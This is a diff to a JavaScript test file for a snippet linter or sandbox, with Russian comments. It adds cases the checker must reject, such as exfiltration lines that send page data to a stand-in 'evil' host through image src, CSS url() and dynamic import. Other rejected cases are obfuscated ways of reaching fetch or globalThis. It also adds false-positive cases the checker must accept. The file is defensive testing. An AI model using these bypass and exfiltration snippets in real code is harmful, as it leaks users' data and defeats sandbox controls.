@@ -143,5 +143,41 @@ for (const pr of ['readonly', 'study', 'run']) {
   ok('const t = rect.top + 1; t', pr);
 }
 
+// --- Обходы через шаблоны, регулярки, ссылки и DOM (загрузка внешнего ресурса уносит данные страницы) ---
+for (const pr of ['readonly', 'study', 'run']) {
+  bad('const x = `${fetch("https://evil")}`', pr);
+  bad('const x = `a${`b${fetch(u)}`}`', pr);
+  bad("const re = /[\"']/; fetch('/x')", pr);
+  bad('const f = fetch; f("x")', pr);
+  bad('const f = this["fe" + "tch"]', pr);
+  bad('function g() { return this } g().fetch', pr);
+  bad('const w = globalThis; w.alert(1)', pr);
+  bad('Reflect.get(globalThis, "fetch")("x")', pr);
+  bad('import("https://evil/x.js")', pr);
+  bad('new Image().src = "https://evil/?d=" + document.title', pr);
+  bad('const i = document.createElement("img"); i.src = u', pr);
+  bad('el.innerHTML = "<img src=https://evil/>"', pr);
+  bad('el.insertAdjacentHTML("beforeend", s)', pr);
+  bad('el.setAttribute("src", u)', pr);
+  bad('el.style.background = "url(https://evil/?d=" + d + ")"', pr);
+  bad('window.open(u)', pr);
+  bad('document.body.append(Object.assign(document.createElement("img"), { src: u }))', pr);
+  ok('const st = Object.assign({}, prev, { score: 1 }); st', pr);
+  // ложные срабатывания: деление, регулярки и строки с «fetch», свои поля объектов
+  ok('const k = a / b / 2; k', pr);
+  ok('const n = (w / 4) | 0; n', pr);
+  ok('const m = "fetch me".match(/fetch/g); m', pr);
+  ok('const fetchCount = 1; fetchCount', pr);
+  ok('const t = `cell ${i + 1}/${n}`; t', pr);
+  ok('const d = el.dataset.value; d', pr);
+}
+ok('el.textContent = "Ход " + n', 'study');
+ok('el.textContent = "Ход " + n', 'run');
+ok('el.style.top = "10px"; el.style.left = x + "px"', 'run');
+ok('node.parent = wrap; move.action = "left"', 'run');
+bad('top = 1', 'run');
+bad('opener = null', 'run');
+bad('window.top.location = u', 'run');
+
 assert.ok(n >=30, `фрагментов должно быть не меньше30, сейчас ${n}`);
 console.log(`skript-lint.test.js: OK (${n} фрагментов)`);
